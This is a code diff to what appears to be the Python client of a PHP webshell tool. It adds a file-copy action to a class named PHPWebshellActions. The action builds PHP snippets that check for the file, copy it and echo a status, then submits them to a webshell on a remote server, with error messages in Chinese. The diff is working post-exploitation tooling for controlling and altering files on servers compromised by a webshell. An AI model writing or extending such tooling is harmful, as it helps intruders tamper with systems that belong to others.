@@ -185,6 +185,25 @@ if(!file_exists($filePath)) {
 """
 )
 
+COPY_FILE_PHP = compress_phpcode_template(
+    """
+$filePath = #FILEPATH#;
+$newFilePath = #NEW_FILEPATH#;
+if(!file_exists($filePath)) {
+    decoder_echo("WRONG_NOT_EXIST");
+}else if(!is_writeable($filePath)) {
+    decoder_echo("WRONG_NO_PERMISSION");
+}else {
+    $result = copy($filePath, $newFilePath);
+    if($result) {
+        decoder_echo("SUCCESS");
+    }else{
+        decoder_echo("FAILED");
+    }
+}
+"""
+)
+
 UPLOAD_FILE_CHECK_PERMISSION_PHP = compress_phpcode_template(
     """
 if(!is_writable(dirname(FILEPATH))) {
@@ -571,10 +590,6 @@ if(!isset($_SESSION[SESSION_NAME])){
 
 PAYLOAD_SESSIONIZE_CHUNK = 1024
 
-__all__ = [
-    "PHPWebshellActions",
-]
-
 basic_info_names = {
     "PHPVERSION": "当前PHP版本",
     "PHP_OS": "操作系统",
@@ -831,6 +846,20 @@ class PHPWebshellActions(PHPSessionInterface):
 
     async def move_file(self, filepath: str, new_filepath: str) -> None:
         php_code = MOVE_FILE_PHP.replace("#FILEPATH#", string_repr(filepath)).replace(
+            "#NEW_FILEPATH#", string_repr(new_filepath)
+        )
+        result = await self.submit(php_code)
+        if result == "WRONG_NOT_EXIST":
+            raise exceptions.FileError("文件不存在")
+        if result == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限移动这个文件")
+        if result == "FAILED":
+            raise exceptions.FileError("因未知原因移动文件失败")
+        if result != "SUCCESS":
+            raise exceptions.FileError("文件没有反馈移动成功")
+
+    async def copy_file(self, filepath: str, new_filepath: str) -> None:
+        php_code = COPY_FILE_PHP.replace("#FILEPATH#", string_repr(filepath)).replace(
             "#NEW_FILEPATH#", string_repr(new_filepath)
         )
         result = await self.submit(php_code)
